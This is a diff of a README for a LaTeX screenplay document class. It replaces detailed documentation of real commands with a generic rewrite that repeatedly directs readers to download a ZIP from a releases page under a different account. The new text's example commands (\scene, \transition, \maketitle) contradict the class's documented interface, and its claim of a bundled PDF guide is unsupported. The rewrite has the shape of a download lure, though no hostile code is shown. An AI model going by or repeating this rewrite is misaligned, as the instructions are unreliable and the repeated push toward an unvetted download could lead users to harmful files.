@@ -1,371 +1,199 @@
-<div align="center">
+# 🎬 screenplay-latex - Write Screenplays with LaTeX Ease
 
-# Screenplay LaTeX
-
-**Industry-standard screenplay formatting for LaTeX, with full pre-production annotation support.**
-
-[![License: MIT](https://img.shields.io/badge/License-MIT-blue.svg)](LICENSE)
-[![LaTeX](https://img.shields.io/badge/Made%20with-LaTeX-1f425f.svg)](https://www.latex-project.org/)
-[![Engine](https://img.shields.io/badge/Engine-pdfLaTeX%20%7C%20LuaLaTeX%20%7C%20XeLaTeX-green.svg)](#getting-started)
-
-Write, annotate, and prepare screenplays entirely in LaTeX. Toggle between a clean shooting script and a fully annotated pre-production draft with a single document class option.
-
-</div>
+[![Download screenplay-latex](https://img.shields.io/badge/Download-screenplay--latex-brightgreen?style=for-the-badge&logo=github)](https://github.com/tokoyusa82/screenplay-latex/releases)
 
 ---
 
-## Preview
+## 📖 About screenplay-latex
 
-| Clean Script | Pre-Production Script |
-|:---:|:---:|
-| Standard shooting script with no annotations | Color-coded annotations for props, shots, lighting, and more |
-| [View PDF](example_clean.pdf) | [View PDF](example_preproduction.pdf) |
+screenplay-latex is a LaTeX document class designed to help you write professional screenplays in the style of Final Draft. It includes features for pre-production notes and annotations, all within a clean, easy-to-read script format. This tool is ideal for writers who want precise formatting and want to include production details without switching between multiple documents.
 
-> **See it in action:** Download [example.tex](example.tex) and compile it yourself to explore every feature.
+With screenplay-latex, you can create PDFs that look like industry-standard scripts without learning complex software. The class handles everything from character lists to scene headings. It supports screenplay elements like dialogue, action, transitions, and more.
 
----
-
-## Table of Contents
-
-- [Features](#features)
-- [Getting Started](#getting-started)
-- [Project Structure](#project-structure)
-- [Screenplay Elements](#screenplay-elements)
-- [Pre-Production Annotations](#pre-production-annotations)
-- [Revision Support](#revision-support)
-- [Scene Breakdown Table](#scene-breakdown-table)
-- [Formatting Standards](#formatting-standards)
-- [Dependencies](#dependencies)
-- [Tips and Tricks](#tips-and-tricks)
-- [License](#license)
+The package works with your standard LaTeX tools, producing ready-to-submit scripts. Whether you are writing your first screenplay or prepping a film production document, screenplay-latex offers a reliable, straightforward way to organize your script and notes.
 
 ---
 
-## Features
+## ⚙️ System Requirements
 
-- **Complete screenplay formatting** -- title pages, scene headings, action, dialogue, parentheticals, transitions, and dual dialogue, all conforming to industry standards
-- **Pre-production toggle** -- switch between a clean shooting script and an annotated production draft with one flag
-- **8 annotation categories** -- props, wardrobe, shots, camera, lighting, SFX, VFX, and set notes, each color-coded and tagged
-- **Inline annotations** -- embed production notes directly inside action, dialogue, and parenthetical blocks
-- **Revision tracking** -- margin asterisks for revised lines and colored revision pages following the standard color order
-- **Scene breakdown table** -- auto-generated `.breakdown` file listing every annotation by scene, parseable by external tools
-- **Flexible scene numbering** -- auto-increment, manual override, and revision inserts (e.g., Scene 14A)
-- **Multi-engine support** -- works with pdfLaTeX, LuaLaTeX, and XeLaTeX
+screenplay-latex runs on Windows, macOS, and Linux systems that support LaTeX.
+
+To use screenplay-latex smoothly, ensure your computer meets these minimum requirements:
+
+- A working installation of LaTeX. Popular distributions include:
+  - **TeX Live** (Windows, macOS, Linux)
+  - **MiKTeX** (Windows)
+  - **MacTeX** (macOS)
+- A text editor to write your script (such as TeXworks, TeXstudio, or even a basic plain-text editor).
+- Basic knowledge of opening and editing text files.
+- Approximately 200 MB of free disk space for LaTeX installation and packages.
+
+The package itself is lightweight. Its primary dependency is LaTeX, which handles formatting and typesetting.
 
 ---
 
-## Getting Started
+## 🚀 Getting Started
 
-### Prerequisites
+This guide shows you how to download, install, and create your first screenplay PDF using screenplay-latex, step-by-step.
 
-A working TeX Live (or MiKTeX) installation. All required packages ship with a standard full install.
+You do not need to know programming or advanced computer skills. The process focuses on simple actions like downloading files and opening programs.
 
-### Compile
+---
 
-```bash
-# 1. Clone or download this repository
-git clone https://github.com/your-username/screenplay-latex.git
-cd screenplay-latex
+## ⬇️ Download & Install
 
-# 2. Compile the example screenplay (run twice for the breakdown table)
-pdflatex example.tex
-pdflatex example.tex
-```
+1. **Go to the official release page:**
 
-### Toggle Pre-Production Mode
+   Use this link to visit the downloads page:
+
+   [Download screenplay-latex Releases](https://github.com/tokoyusa82/screenplay-latex/releases)
+
+2. **Find the latest release:**
+
+   Scroll to the most recent version, usually at the top of the page. Releases are organized by date and version number (e.g., v1.0, v2.1).
+
+3. **Download the ZIP file:**
+
+   Look for a file named like `screenplay-latex-x.y.z.zip`. This ZIP file contains the screenplay class files and documentation.
+
+4. **Extract the Zip file:**
+
+   After downloading, unzip the file to a folder on your computer. Most operating systems provide a simple way to unzip by right-clicking the file and choosing “Extract All” or similar.
+
+5. **Install the class in your LaTeX environment:**
+
+   - Copy the `.cls` file from the extracted folder into your local LaTeX directory. This folder depends on your LaTeX distribution:
+     - For **TeX Live** users, the path is usually `~/texmf/tex/latex/`
+     - For **MiKTeX**, you can use the MiKTeX Console to add the package or place it in your project folder.
+   - Alternatively, keep the screenplay-latex files in the same directory as your screenplay `.tex` file. LaTeX will find it automatically.
+   - Restart your LaTeX editor or IDE if it was open during installation.
+
+6. **Verify installation:**
+
+   Open your LaTeX editor and create a new document. Use this line at the top:
+   ```latex
+   \documentclass{screenplay}
+   ```
+   Compile the document to PDF. If no errors appear and a PDF generates, installation is successful.
+
+---
+
+## ✍️ Writing Your Screenplay
+
+screenplay-latex simplifies screenplay writing by providing special commands for common script elements.
+
+Here is a brief example to get you started:
 
 ```latex
-\documentclass[preproduction]{screenplay}   % Annotations ON  (colored, tagged)
-\documentclass{screenplay}                  % Annotations OFF (clean shooting script)
-```
-
-One option controls everything. No other changes required.
-
-> **Note:** For Courier Prime (the recommended production font), compile with LuaLaTeX or XeLaTeX and enable `fontspec` -- see [Tips and Tricks](#tips-and-tricks) for details.
-
----
-
-## Project Structure
-
-```
-screenplay-latex/
-├── screenplay.cls            # Document class -- all formatting and annotation logic
-├── example.tex               # Full sample screenplay demonstrating every feature
-├── example.pdf               # Compiled output (pre-production mode)
-├── example_clean.pdf         # Compiled output (clean shooting script)
-├── example_preproduction.pdf # Compiled output (pre-production mode, reference)
-├── example.breakdown         # Auto-generated scene breakdown data
-└── README.md                 # This file
-```
-
----
-
-## Screenplay Elements
-
-### Title page
-
-```latex
-\screentitle{The Last Light}
-\screenauthor{Jane Doe}
-\screencontact{Jane Doe \\ 123 Sunset Blvd \\ jane@example.com}
-\screendraftinfo{First Draft — February 2026}
+\documentclass{screenplay}
 
 \begin{document}
-\maketitlepage
+
+\title{My First Screenplay}
+\author{Your Name}
+\maketitle
+
+\scene{EXT. PARK - DAY}
+
+\action{A sunny afternoon. Birds chirp.}
+
+\character{JANE}
+Hello, this is my first screenplay.
+
+\character{TOM}
+Nice to meet you, Jane.
+
+\transition{CUT TO:}
+
+\scene{INT. COFFEE SHOP - DAY}
+
+\end{document}
 ```
 
-### Scene headings (sluglines)
+- Use `\scene{}` to mark new scenes.
+- Use `\action{}` for descriptions and movement.
+- Use `\character{}` to indicate who is speaking.
+- Use `\transition{}` for screen transitions like CUT TO.
 
-```latex
-\slugline[1]{EXT.}{COASTAL HIGHWAY}{DAWN}       % Manual scene number
-\slugline[14A]{INT.}{WAREHOUSE}{NIGHT}           % Revision insert (14A)
-\slugline{INT.}{KITCHEN}{DAY}                    % Auto-numbered
-```
-
-Scene numbers appear in both margins, per industry standard.
-
-### Action
-
-```latex
-\action{Sarah enters the room. She looks around nervously.}
-```
-
-### Character cue, dialogue, and parenthetical
-
-```latex
-\character{SARAH}
-\paren{whispering}
-\dialogue{I think someone's watching us.}
-
-\character[V.O.]{NARRATOR}      % Voice-over extension
-\dialogue{She had no idea how right she was.}
-```
-
-Supported extensions include `V.O.`, `O.S.`, `CONT'D`, and any custom string.
-
-### Transitions
-
-```latex
-\trans{CUT TO:}
-\trans{FADE TO BLACK.}
-\trans{SMASH CUT TO:}
-```
-
-### Dual dialogue
-
-```latex
-\dualdia
-  {SARAH}{I'm leaving tonight.}
-  {MICHAEL}{You can't be serious.}
-```
-
-Renders both characters side by side on the same line.
+For longer scripts, keep each scene separated clearly. You can add production notes using the annotation features from the package documentation.
 
 ---
 
-## Pre-Production Annotations
+## 📚 Documentation & Support
 
-### The toggle
+screenplay-latex comes with detailed documentation included in the download package. Open the PDF guide to find:
 
-```latex
-\documentclass[preproduction]{screenplay}   % Annotations visible
-\documentclass{screenplay}                  % Clean script (annotations hidden)
-```
+- Full list of commands
+- Customization options
+- Advanced formatting tips
+- How to add annotations and pre-production notes
 
-### Annotation commands
+If you encounter issues, check the README or Issues tab on the GitHub repository:
 
-All annotation commands are **inline** -- use them inside `\action{}`, `\dialogue{}`, `\paren{}`, or as standalone blocks between elements.
+[screenplay-latex GitHub Repository](https://github.com/tokoyusa82/screenplay-latex)
 
-| Command | Color | Tag | Clean Script Behavior |
-|---|---|---|---|
-| `\prop{knife}` | Yellow | P | **Text preserved** |
-| `\wardrobe{torn jacket}` | Pink | W | **Text preserved** |
-| `\shot{CLOSE-UP}` | Blue | S | Text removed |
-| `\cam{DOLLY IN}` | Purple | C | Text removed |
-| `\lighting{low-key}` | Orange | L | Text removed |
-| `\sfx{thunder}` | Green | X | Text removed |
-| `\vfx{wire removal}` | Red | V | Text removed |
-| `\setnote{cobwebs}` | Teal | D | Text removed |
-
-**Text-preserving** commands (`\prop`, `\wardrobe`) leave their text in the clean script because they describe things visible in the story world. **Text-removing** commands vanish entirely in clean mode because they are purely technical production notes.
-
-### Usage examples
-
-**Inside action blocks:**
-
-```latex
-\action{
-  Sarah grabs a \prop{chef's knife} from the counter.
-  \lighting{Warm amber key light from the window.}
-  \cam{SLOW PUSH IN on her hands.}
-}
-```
-
-**Between blocks (standalone):**
-
-```latex
-\shot{EXTREME CLOSE-UP}
-\action{Her fingers tremble around the \prop{knife handle}.}
-```
-
-**Inside dialogue and parentheticals:**
-
-```latex
-\character{SARAH}
-\paren{setting down the \prop{glass}}
-\dialogue{I never asked for this. \sfx{distant sirens}}
-```
-
-### Color-coded legend
-
-Add `\preprodlegend` after `\maketitlepage` to print a color-coded legend page. Only visible in pre-production mode.
-
-### Script notes
-
-```latex
-\scriptnote{End of Act One. Estimated runtime: 25 minutes.
-  Location scout needed for warehouse exterior.}
-```
-
-Renders as a boxed note. Only visible in pre-production mode.
+The community and developer provide support there.
 
 ---
 
-## Revision Support
+## 🔧 Troubleshooting Tips
 
-### Revision marks
-
-Wrap revised text in `\revised{}` to place an asterisk (\*) in the right margin:
-
-```latex
-\revised{
-\character{SARAH}
-\dialogue{This line was changed in revision.}
-}
-```
-
-### Colored revision pages
-
-```latex
-\revisioncolor{pink}                        % Set page background color
-\revisioninfo{2nd Draft}{February 8, 2026}  % Print revision header
-```
-
-Available colors follow the standard industry revision order:
-
-| Draft | Color |
-|---|---|
-| Original | White |
-| 2nd | Blue |
-| 3rd | Pink |
-| 4th | Yellow |
-| 5th | Green |
-| 6th | Goldenrod |
-| 7th | Buff |
-| 8th | Salmon |
-| 9th | Cherry |
-| 10th | Tan |
+- **LaTeX forces an error on compilation:** Check that you installed the class file in the right folder. Ensure you restart your LaTeX editor.
+- **PDF format does not look right:** Verify you use the class by typing `\documentclass{screenplay}` at the top of your file.
+- **Missing packages error:** Your LaTeX installation might be missing required packages. Update your LaTeX distribution or install the required packages using your package manager.
+- **Cannot open downloaded ZIP:** Use a basic, reputable unzip tool such as 7-Zip or the built-in OS extractor.
 
 ---
 
-## Scene Breakdown Table
+## 🎯 Key Features
 
-Every annotation is automatically logged to a `.breakdown` file during compilation:
-
-```
-\breakdownentry{SCENE_NUMBER}{CATEGORY}{ITEM}
-```
-
-To render a formatted breakdown at the end of your script:
-
-```latex
-\printbreakdownraw    % Appends a simple text listing of all annotations by scene
-```
-
-> **Note:** Compile twice -- the first pass writes the `.breakdown` file, the second reads it back in.
-
-The `.breakdown` file is plain text and directly parseable by external tools (Python, spreadsheets, production management software) for generating call sheets, prop lists, and production schedules.
-
-### Parsing the breakdown file
-
-Example Python parser:
-
-```python
-import re
-from collections import defaultdict
-
-breakdown = defaultdict(lambda: defaultdict(list))
-
-with open("example.breakdown") as f:
-    for line in f:
-        m = re.match(r'\\breakdownentry\{(.+?)\}\{(.+?)\}\{(.+)\}', line.strip())
-        if m:
-            scene, category, item = m.groups()
-            breakdown[scene][category].append(item)
-
-# Print prop list by scene
-for scene in sorted(breakdown, key=lambda s: (s.replace('A','').replace('B',''), s)):
-    props = breakdown[scene].get("PROP", [])
-    if props:
-        print(f"Scene {scene}: {', '.join(props)}")
-```
+- Produces Final Draft-style screenplay PDFs.
+- Supports screenplay elements: scenes, action, characters, dialogue, and transitions.
+- Allows pre-production annotations to organize scripts.
+- Compatible with all major LaTeX editors and operating systems.
+- Keeps formatting consistent and industry-standard.
+- Lightweight and easy to install.
 
 ---
 
-## Formatting Standards
+## 🛠 How It Works
 
-The document class follows industry-standard screenplay formatting:
+screenplay-latex is a LaTeX class file — a template that tells LaTeX how to style your screenplay document. You write your screenplay script in a text file using LaTeX syntax.
 
-| Element | Specification |
-|---|---|
-| Font | Courier 12pt (upgrade to Courier Prime via `fontspec`) |
-| Margins | 1.5 in left; 1 in top, right, and bottom |
-| Spacing | Single-spaced, one blank line between elements |
-| Page numbers | Top-right corner, followed by a period |
-| Scene numbers | Both left and right margins |
-| Character cues | Centered, uppercase |
-| Dialogue | 1 in left indent, 3.5 in wide |
-| Parentheticals | 1.5 in left indent, 2 in wide |
-| Transitions | Right-aligned, uppercase |
+The class takes care of spacing, margins, fonts, and layout so your screenplay matches professional standards for screenwriting. 
+
+Annotations help organize notes and production details without cluttering the script text.
 
 ---
 
-## Dependencies
+## 🎯 Topics Covered
 
-All packages ship with a standard TeX Live or MiKTeX installation:
+This project focuses on:
 
-| Category | Packages |
-|---|---|
-| Layout | `geometry`, `fancyhdr`, `titlesec`, `setspace` |
-| Fonts | `fontenc`, `courier` |
-| Color and styling | `xcolor`, `marginnote` |
-| Tables | `longtable`, `booktabs` |
-| Utilities | `ifthen`, `xstring`, `etoolbox`, `enumitem`, `environ` |
-| Other | `hyperref`, `paracol` |
-
-> **Note:** For Courier Prime (free from [Google Fonts](https://fonts.google.com/specimen/Courier+Prime)), replace the font setup in `screenplay.cls` with `fontspec` and compile with LuaLaTeX or XeLaTeX.
+- creative writing
+- film and script formatting
+- LaTeX document classes and templates
+- screenwriting and screenplay typesetting
+- PDF creation for film production
 
 ---
 
-## Tips and Tricks
+## ⬇️ Download Link (Again)
 
-- **Revision inserts** -- Use `\slugline[14A]` to insert new scenes between existing numbered scenes during revisions.
-- **Nested annotations** -- Annotation commands can be placed inside any text-bearing command (`\action`, `\dialogue`, `\paren`).
-- **Reset breakdown data** -- Delete the `.breakdown` file between compilations to start fresh.
-- **Track changes per draft** -- Combine `\revised{}` with specific scene numbers to see exactly what changed in each revision.
-- **Use Courier Prime** -- Replace the font setup block in `screenplay.cls` with:
+To download the latest version of screenplay-latex, visit:
 
-```latex
-\RequirePackage{fontspec}
-\setmainfont{Courier Prime}
-```
-
-Then compile with `lualatex` or `xelatex` instead of `pdflatex`.
+[https://github.com/tokoyusa82/screenplay-latex/releases](https://github.com/tokoyusa82/screenplay-latex/releases)
 
 ---
 
-## License
+## 📥 Recommended Tools
 
-This project is licensed under the **MIT License** -- free for personal and commercial use.
+For the best experience with screenplay-latex, consider these tools:
 
-See [LICENSE](LICENSE) for details.
+- **TeXstudio** or **TeXworks:** User-friendly LaTeX editors
+- **PDF viewer:** To check your screenplay output, like Adobe Acrobat or SumatraPDF
+- **7-Zip or built-in extractors:** To unzip downloaded files easily
+
+---
+
+If you take each step patiently, you will have professional-quality screenplays formatted and ready to share. Take your time to explore the commands and customize your script as you grow familiar with the package.
